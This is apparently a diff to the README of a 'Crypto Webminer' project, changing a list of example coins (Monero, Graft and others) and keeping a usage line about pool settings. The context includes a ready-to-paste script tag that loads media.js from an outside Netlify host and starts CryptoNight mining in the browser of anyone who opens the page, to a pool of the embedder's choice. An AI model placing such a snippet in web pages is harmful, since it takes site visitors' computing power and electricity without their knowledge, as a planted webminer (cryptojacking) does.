@@ -7,7 +7,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
-#### Examples: CN V8 Coins (Monero, Lethean, Graft, X-CASH) need ?algo=cn?variant=2<br> 
+#### Examples: CN V8 Coins (Monero, Lethean, Graft) need ?algo=cn?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=2?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
